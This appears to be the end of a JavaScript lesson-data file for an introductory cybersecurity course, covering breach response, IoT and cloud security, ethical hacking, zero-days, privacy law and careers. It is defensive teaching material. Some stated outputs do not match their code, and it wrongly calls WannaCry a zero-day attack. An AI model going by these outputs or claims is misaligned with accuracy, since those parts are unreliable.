    output: '{ severityLevel: "Critical", estimatedCost: "$102000000", affectedUsers: 500000, responsePriority: "IMMEDIATE", notificationsRequired: [...] }',
    notes: [
      'Use Have I Been Pwned (haveibeenpwned.com) to check if your data was breached',
      'Monitor credit reports for unauthorized accounts after breaches',
      'Change passwords for affected accounts immediately after notification',
      'Contact your bank/credit card company if payment data was exposed'
    ],
    practice: {
      title: 'Plan Breach Response',
      description: 'Your company discovers a data breach exposing 100,000 customer records with passwords and emails. Outline your immediate response (first 24 hours).',
      startCode: '',
      hint: 'Consider containment, investigation, notification, and communication.',
      solution: 'Immediate: (1) Isolate breached system, (2) Engage incident response team, (3) Preserve evidence, (4) Begin user notification, (5) Contact law enforcement, (6) Assess scope and impact'
    }
  },
  {
    id: 'cyber-iot-security',
    category: 'Advanced Topics',
    title: 'IoT Security',
    difficulty: 'Advanced',
    theory: [
      'Internet of Things (IoT) devices—smart home devices, security cameras, thermostats, medical equipment—connect to networks but often have weak security, making them targets for compromise.',
      'IoT vulnerabilities include default passwords, lack of updates, weak encryption, and insecure communication protocols. Compromised IoT devices become botnets for DDoS attacks or jump points for network intrusions.',
      'IoT security requires strong default credentials, regular firmware updates, network segmentation (separate network for IoT), and encryption of all communications.',
      'Organizations deploying IoT must establish update mechanisms, monitor for anomalies, implement access controls, and establish responsible disclosure for security researchers finding vulnerabilities.'
    ],
    syntax: 'IoT Security Practices:\n- Change default credentials\n- Isolate on separate network\n- Enable automatic updates\n- Encrypt all communications\n- Monitor for anomalies\n- Firewall IoT devices',
    code: `// IoT Device Security Validator
function validateIoTDeviceSecurity(device) {
  const securityChecks = {
    defaultPasswordChanged: device.credentialsChanged === true,
    latestFirmware: device.firmwareUpToDate === true,
    encryptedCommunication: device.usesEncryption === true,
    isolatedNetwork: device.onSeparateNetwork === true,
    hasAuthentication: device.requiresAuth === true,
    firmwareAutoUpdate: device.autoUpdates === true,
    canDisableFeatures: device.allowFeatureDisable === true
  };

  const securityScore = Object.values(securityChecks).filter(Boolean).length;

  const vulnerabilities = Object.entries(securityChecks)
    .filter(([_, passed]) => !passed)
    .map(([check, _]) => check);

  return {
    deviceName: device.name,
    securityScore: securityScore + '/7',
    isSecure: securityScore >= 6,
    vulnerabilities: vulnerabilities,
    riskLevel: securityScore >= 6 ? 'Low' : securityScore >= 4 ? 'Medium' : 'High',
    remediation: vulnerabilities.length > 0 ? 'Address vulnerabilities immediately' : 'Device well-secured'
  };
}

const device = {
  name: 'Smart Camera',
  credentialsChanged: false,
  firmwareUpToDate: true,
  usesEncryption: true,
  onSeparateNetwork: true,
  requiresAuth: true,
  autoUpdates: false
};

console.log(validateIoTDeviceSecurity(device));`,
    output: '{ deviceName: "Smart Camera", securityScore: "5/7", isSecure: false, vulnerabilities: ["defaultPasswordChanged", "firmwareAutoUpdate"], riskLevel: "Medium", remediation: "Address vulnerabilities immediately" }',
    notes: [
      'Change default credentials on all IoT devices immediately after setup',
      'Place IoT devices on a separate network from computers and sensitive systems',
      'Disable unnecessary features (microphone, camera) if not in use',
      'Research devices before buying—avoid brands with known security issues'
    ],
    practice: {
      title: 'Secure Your Smart Home',
      description: 'You\'ve set up smart home devices (camera, lock, thermostat). Create a security plan to protect your network and data.',
      startCode: '',
      hint: 'Consider network isolation, strong passwords, updates, and monitoring.',
      solution: 'Steps: (1) Change all default passwords, (2) Create separate IoT network, (3) Enable firmware auto-updates, (4) Use strong SSID/password, (5) Monitor network traffic'
    }
  },
  {
    id: 'cyber-cloud-security',
    category: 'Advanced Topics',
    title: 'Cloud Security Basics',
    difficulty: 'Advanced',
    theory: [
      'Cloud security involves protecting data and applications hosted on cloud platforms (AWS, Azure, Google Cloud). Shared responsibility models mean both providers and customers must secure systems.',
      'Cloud providers secure infrastructure, but customers are responsible for data encryption, access controls, identity management, and application security. Misconfiguration is a leading cause of cloud breaches.',
      'Cloud security practices include encryption at rest and in transit, multi-factor authentication, least privilege access, regular backups, and monitoring for unauthorized access.',
      'Cloud compliance with regulations like GDPR, HIPAA, and SOC 2 requires documented security measures, audit logs, and privacy controls. Certifications from third-party auditors provide assurance.'
    ],
    syntax: 'Cloud Security Responsibilities:\nProvider: Infrastructure, hypervisor, physical security\nCustomer: Data encryption, access control, identity, backup',
    code: `// Cloud Security Configuration Validator
function validateCloudSecurity(cloudConfig) {
  const securityMeasures = {
    dataEncryptedAtRest: cloudConfig.encryptionAtRest === true,
    dataEncryptedInTransit: cloudConfig.tlsForConnections === true,
    mfaEnabled: cloudConfig.mfaRequired === true,
    leastPrivilegePrinciple: cloudConfig.roleBasedAccess === true,
    backupStrategy: cloudConfig.backupFrequency ? true : false,
    auditLogging: cloudConfig.logsEnabled === true,
    monitoringActive: cloudConfig.monitoringEnabled === true,
    incidentResponse: cloudConfig.hasIncidentPlan === true
  };

  const complianceScore = Object.values(securityMeasures).filter(Boolean).length;

  return {
    overallSecurityScore: complianceScore + '/8',
    isCompliant: complianceScore >= 7,
    gaps: Object.entries(securityMeasures)
      .filter(([_, passed]) => !passed)
      .map(([measure, _]) => measure),
    recommendation: complianceScore >= 7 ? 'Cloud environment is well-secured' : 'Address security gaps before production',
    nextSteps: complianceScore < 8 ? 'Implement missing controls' : 'Continue monitoring and auditing'
  };
}

const config = {
  encryptionAtRest: true,
  tlsForConnections: true,
  mfaRequired: true,
  roleBasedAccess: true,
  backupFrequency: 'daily',
  logsEnabled: true,
  monitoringEnabled: true,
  hasIncidentPlan: false
};

console.log(validateCloudSecurity(config));`,
    output: '{ overallSecurityScore: "7/8", isCompliant: true, gaps: ["incidentResponse"], recommendation: "Cloud environment is well-secured", nextSteps: "Implement missing controls" }',
    notes: [
      'Encrypt sensitive data before uploading to cloud—don\'t rely solely on provider encryption',
      'Regularly audit cloud access logs for unauthorized activity',
      'Use a Cloud Access Security Broker (CASB) to monitor cloud usage',
      'Implement data loss prevention (DLP) to prevent accidental exposure'
    ],
    practice: {
      title: 'Design Secure Cloud Architecture',
      description: 'Design a secure cloud architecture for storing customer data. Include encryption, access controls, backups, and monitoring.',
      startCode: '',
      hint: 'Consider data at rest/transit encryption, IAM roles, backup strategy, and audit logs.',
      solution: 'Include: (1) AES-256 encryption at rest, (2) TLS for all connections, (3) Role-based access control, (4) Daily automated backups to separate region, (5) CloudTrail/audit logging enabled, (6) Real-time monitoring'
    }
  },
  {
    id: 'cyber-ethical-hacking',
    category: 'Advanced Topics',
    title: 'Ethical Hacking',
    difficulty: 'Advanced',
    theory: [
      'Ethical hacking (authorized penetration testing) involves authorized security professionals testing systems for vulnerabilities, helping organizations identify and fix security flaws before attackers do.',
      'Ethical hackers follow strict rules: only test systems with written authorization, maintain confidentiality, report findings responsibly, and never access more data than necessary.',
      'Common methods include vulnerability scanning (automated tools), penetration testing (manual exploitation), social engineering tests, and physical security assessments.',
      'Bug bounty programs pay security researchers to find vulnerabilities. Major companies like Google, Microsoft, and Facebook offer programs, creating legal channels for hackers to help companies improve security.'
    ],
    syntax: 'Ethical Hacking Process:\n1. Reconnaissance (gather info)\n2. Scanning (identify systems)\n3. Enumeration (find services)\n4. Vulnerability assessment\n5. Exploitation (with authorization)\n6. Reporting and remediation',
    code: `// Ethical Hacking Assessment Framework
function conductSecurityAssessment(target, authorization) {
  if (!authorization.hasWrittenPermission) {
    return { error: 'UNAUTHORIZED - Must have written permission' };
  }

  const assessmentPhases = {
    reconnaissance: {
      step: 'Gather public information about target',
      methods: ['OSINT', 'Domain research', 'Organization info'],
      deliverable: 'Intelligence report'
    },
    scanning: {
      step: 'Identify live systems and open ports',
      methods: ['Port scanning', 'Service detection'],
      tools: ['Nmap', 'Shodan'],
      deliverable: 'System inventory'
    },
    enumeration: {
      step: 'Extract detailed service information',
      methods: ['Banner grabbing', 'Version detection'],
      deliverable: 'Service details'
    },
    vulnerabilityAssessment: {
      step: 'Identify security weaknesses',
      methods: ['Automated scanning', 'Manual testing'],
      tools: ['Nessus', 'Burp Suite'],
      deliverable: 'Vulnerability report'
    },
    exploitation: {
      step: 'Attempt to exploit vulnerabilities',
      restrictions: 'Only with explicit authorization per vulnerability',
      deliverable: 'Proof of concept'
    },
    reporting: {
      step: 'Document findings and recommendations',
      includes: ['Severity rating', 'Remediation steps', 'Timeline'],
      deliverable: 'Professional report'
    }
  };

  return {
    assessmentAuthorized: true,
    scope: authorization.scope,
    timeline: authorization.timeline,
    phases: assessmentPhases,
    successCriteria: 'Identify vulnerabilities without causing harm or accessing unnecessary data'
  };
}

const auth = {
  hasWrittenPermission: true,
  scope: 'Internal systems only',
  timeline: '2 weeks'
};

console.log('Assessment authorized:', conductSecurityAssessment({}, auth).assessmentAuthorized);`,
    output: 'Assessment authorized: true | Assessment includes all phases with proper scoping and reporting requirements',
    notes: [
      'Always obtain written authorization before any penetration testing',
      'Stay within the agreed scope—testing unauthorized systems is illegal',
      'Report vulnerabilities responsibly with reasonable remediation time before public disclosure',
      'Consider certifications (CEH, OSCP) to formalize ethical hacking skills'
    ],
    practice: {
      title: 'Write Penetration Test Report',
      description: 'After an authorized penetration test, write an executive summary including vulnerabilities found, severity ratings, and remediation recommendations.',
      startCode: '',
      hint: 'Include risk rating, brief description, potential impact, and remediation steps for each vulnerability.',
      solution: 'Report includes: (1) Executive summary, (2) Findings with severity (Critical/High/Medium/Low), (3) Proof of concept, (4) Recommended fixes, (5) Timeline for remediation'
    }
  },
  {
    id: 'cyber-zero-day',
    category: 'Advanced Topics',
    title: 'Zero-Day Vulnerabilities',
    difficulty: 'Advanced',
    theory: [
      'A zero-day vulnerability is a previously unknown security flaw that vendors haven\'t patched yet. Attackers can exploit these flaws without any public defenses available.',
      'Zero-day exploits are valuable on dark markets—security researchers sell them to vendors, while criminal hackers sell them to other criminals. Some governments use them for espionage.',
      'Prevention is impossible (by definition, the flaw is unknown), but detection is possible through behavior monitoring and anomaly detection. Organizations should assume they\'ll be targeted and implement defense-in-depth.',
      'Responsible disclosure means reporting zero-days to vendors before public release. Vendors have time to develop patches while exploits remain hidden. Researchers who practice responsible disclosure are praised.'
    ],
    syntax: 'Zero-Day Cycle:\n1. Vulnerability discovered (unknown to vendor)\n2. Exploit developed\n3. Attack on targets (0 days since disclosure)\n4. Public disclosure (if ever)\n5. Patch released\n6. Adoption of patch',
    code: `// Zero-Day Risk Mitigation
function assessZeroDayRisk(systemConfig) {
  const defenseInDepthLayers = {
    networkSegmentation: systemConfig.networkSegmented === true ? 1 : 0,
    hostBasedFirewall: systemConfig.hostFirewall === true ? 1 : 0,
    edr: systemConfig.hasEndpointDetection === true ? 2 : 0, // EDR catches anomalies
    anomalyDetection: systemConfig.hasAnomalyDetection === true ? 2 : 0,
    limitedPrivileges: systemConfig.useLeastPrivilege === true ? 1 : 0,
    backups: systemConfig.hasOfflineBackups === true ? 1 : 0,
    monitoring: systemConfig.hasSecurityMonitoring === true ? 1 : 0
  };

  const defenseScore = Object.values(defenseInDepthLayers).reduce((a, b) => a + b, 0);

  return {
    zeroDayResilienceScore: defenseScore + '/9',
    canSurviveZeroDay: defenseScore >= 6,
    recommendations: [
      'EDR solutions can detect anomalous behavior from zero-day exploits',
      'Network segmentation limits lateral movement from compromised systems',
      'Offline backups enable recovery without paying ransom',
      'Continuous monitoring helps detect exploitation attempts',
      'No single layer stops zero-days—defense in depth is essential'
    ],
    acceptableRisk: defenseScore >= 6 ? 'Yes, with continuous monitoring' : 'Gaps exist—implement additional controls'
  };
}

const config = {
  networkSegmented: true,
  hostFirewall: true,
  hasEndpointDetection: true,
  hasAnomalyDetection: true,
  useLeastPrivilege: true,
  hasOfflineBackups: true,
  hasSecurityMonitoring: true
};

console.log(assessZeroDayRisk(config));`,
    output: '{ zeroDayResilienceScore: "9/9", canSurviveZeroDay: true, acceptableRisk: "Yes, with continuous monitoring" }',
    notes: [
      'Assume you\'ll be targeted by zero-day exploits—focus on detection and containment',
      'Endpoint Detection and Response (EDR) tools catch anomalous behavior from exploits',
      'Stuxnet and WannaCry were zero-day attacks with massive global impact',
      'Practice responsible disclosure if you discover a zero-day—report to vendor, not attackers'
    ],
    practice: {
      title: 'Build Zero-Day Defense Strategy',
      description: 'Design a defense strategy for a financial institution assuming zero-day exploits will target their systems.',
      startCode: '',
      hint: 'Consider detection, containment, backup, and isolation.',
      solution: 'Include: (1) EDR on all endpoints, (2) Network segmentation, (3) Anomaly detection, (4) Offline backups, (5) Incident response plan, (6) Security monitoring 24/7'
    }
  },
  {
    id: 'cyber-data-privacy-laws',
    category: 'Privacy & Encryption',
    title: 'GDPR & India\'s DPDPA',
    difficulty: 'Intermediate',
    theory: [
      'The General Data Protection Regulation (GDPR) is EU law requiring organizations to protect personal data, obtain consent before processing, and provide users rights to access/delete their data. Non-compliance costs up to 4% of revenue.',
      'India\'s Digital Personal Data Protection Act (DPDPA) establishes similar protections for Indian citizens: explicit consent, purpose limitation, data security, and rights to access/correct/delete personal data.',
      'Both laws require data protection impact assessments, breach notification within specific timeframes, and designate Data Protection Officers (DPOs) for larger organizations.',
      'Compliance involves legal review of data practices, technical controls (encryption, access logging), staff training, and documented processes. Organizations processing data from EU or India must comply regardless of location.'
    ],
    syntax: 'GDPR Key Principles:\n- Lawful basis for processing\n- Transparency (privacy notices)\n- Consent (explicit opt-in)\n- Purpose limitation (only stated purposes)\n- Data minimization (collect only necessary)\n- Storage limitation (delete after purpose)',
    code: `// GDPR/DPDPA Compliance Checker
function checkComplianceStatus(organization) {
  const complianceElements = {
    privacyNotice: organization.hasPrivacyPolicy === true ? 1 : 0,
    consentMechanism: organization.hasConsentForm === true ? 1 : 0,
    dataEncryption: organization.encryptsData === true ? 1 : 0,
    breachNotification: organization.hasBreachPlan === true ? 1 : 0,
    dpoDesignated: organization.hasDPO === true ? 1 : 0,
    dataProcessingAgreement: organization.hasDPA === true ? 1 : 0,
    userRights: organization.enablesAccessRequests === true ? 1 : 0,
    dataRetentionPolicy: organization.hasRetentionPolicy === true ? 1 : 0,
    interoperability: organization.supportDataPortability === true ? 1 : 0
  };

  const complianceScore = Object.values(complianceElements).reduce((a, b) => a + b, 0);

  return {
    complianceScore: complianceScore + '/9',
    isFullyCompliant: complianceScore >= 9,
    gdprCompliant: complianceScore >= 7,
    dpgpaCompliant: complianceScore >= 7,
    gaps: Object.entries(complianceElements)
      .filter(([_, score]) => score === 0)
      .map(([element, _]) => element),
    estimatedFineIfBreached: organization.revenue * 0.04,
    nextSteps: 'Address gaps and document compliance efforts'
  };
}

const org = {
  revenue: 10000000, // $10M
  hasPrivacyPolicy: true,
  hasConsentForm: true,
  encryptsData: true,
  hasBreachPlan: true,
  hasDPO: true,
  hasDPA: true,
  enablesAccessRequests: true,
  hasRetentionPolicy: true,
  supportDataPortability: false
};

console.log(checkComplianceStatus(org));`,
    output: '{ complianceScore: "8/9", isFullyCompliant: false, gdprCompliant: true, dpgpaCompliant: true, gaps: ["supportDataPortability"], estimatedFineIfBreached: "$400000" }',
    notes: [
      'GDPR applies to any organization processing EU residents\' data, regardless of location',
      'DPDPA applies to processing Indian residents\' personal data',
      'Consent must be explicit, informed, and freely given—pre-checked boxes are invalid',
      'Users have rights to access, rectify, delete, and port their data'
    ],
    practice: {
      title: 'Create Privacy Compliance Plan',
      description: 'Your startup collects user data in India and EU. Create a privacy compliance plan addressing GDPR and DPDPA requirements.',
      startCode: '',
      hint: 'Consider legal basis, consent, data security, user rights, and breach notification.',
      solution: 'Include: (1) Privacy policy, (2) Consent forms, (3) Data encryption, (4) Breach notification plan, (5) User access/delete process, (6) Data retention schedule, (7) DPO designation'
    }
  },
  {
    id: 'cyber-careers',
    category: 'Advanced Topics',
    title: 'Cybersecurity Careers',
    difficulty: 'Beginner',
    theory: [
      'Cybersecurity careers range from entry-level Security Analyst positions to expert roles like Chief Information Security Officer (CISO). The field is growing rapidly—demand far exceeds supply.',
      'Common roles include Security Analyst (monitor alerts), Penetration Tester (test for vulnerabilities), Security Architect (design systems), Incident Response Manager (handle breaches), and Security Engineer (implement controls).',
      'Entry requirements include a degree (Computer Science, IT, Cybersecurity) or certifications (CompTIA Security+, CEH), plus hands-on experience with labs and projects.',
      'The field offers excellent career growth, competitive salaries, remote opportunities, and the satisfaction of protecting organizations and people from cyber threats.'
    ],
    syntax: 'Common Certifications:\n- CompTIA Security+ (Entry-level)\n- Certified Ethical Hacker (CEH)\n- Certified Information Systems Security Professional (CISSP)\n- Offensive Security Certified Professional (OSCP)',
    code: `// Cybersecurity Career Path Planner
function planSecurityCareer(currentLevel) {
  const careerPaths = {
    entry: {
      title: 'Security Analyst',
      salary: '\\$60k-80k',
      requirements: ['CompTIA Security+', 'CCNA or equivalent'],
      responsibilities: ['Monitor alerts', 'Manage logs', 'Support incidents'],
      timeline: '0-2 years experience'
    },
    intermediate: {
      title: 'Penetration Tester / Security Engineer',
      salary: '\\$90k-130k',
      requirements: ['CEH', 'OSCP', 'Security+ background'],
      responsibilities: ['Conduct tests', 'Design systems', 'Security research'],
      timeline: '3-8 years experience'
    },
    advanced: {
      title: 'Security Architect / Manager',
      salary: '\\$130k-180k',
      requirements: ['CISSP', 'Industry experience'],
      responsibilities: ['Design strategy', 'Lead teams', 'Risk management'],
      timeline: '8+ years experience'
    },
    executive: {
      title: 'Chief Information Security Officer (CISO)',
      salary: '\\$200k+',
      requirements: ['CISSP', 'Executive experience'],
      responsibilities: ['Enterprise strategy', 'Board reporting', 'Risk governance'],
      timeline: '15+ years experience'
    }
  };

  const nextSteps = {
    study: 'Pursue relevant certifications',
    practice: 'Build lab environment and practice',
    network: 'Join security communities (OWASP, local meetups)',
    contribute: 'Open source security projects',
    learn: 'Stay current with threat landscape'
  };

  return {
    careerPaths: careerPaths,
    recommendedPath: careerPaths[currentLevel],
    successFactors: nextSteps,
    jobMarket: 'Cybersecurity jobs are in high demand with excellent growth prospects'
  };
}

console.log('Career path:', planSecurityCareer('entry'));`,
    output: 'Career path: { entry: { title: "Security Analyst", salary: "$60k-80k", requirements: ["Security+", "CCNA"], timeline: "0-2 years" }, ... }',
    notes: [
      'Certifications are valuable but practical experience matters more for interviews',
      'Build a home lab to practice security tools and techniques',
      'Contribute to open-source security projects to build portfolio',
      'Join security communities (OWASP, local meetups) for networking and learning'
    ],
    practice: {
      title: 'Plan Your Security Career',
      description: 'Design a 5-year career plan in cybersecurity. Include certifications, skills to develop, and experience you\'ll gain.',
      startCode: '',
      hint: 'Consider entry role, progression, certifications, and target position.',
      solution: 'Year 1: Security+ cert, security analyst role | Year 2: CCNA or CEH prep | Year 3-4: Penetration tester, OSCP cert | Year 5: Architect or specialized role'
    }
  }
];
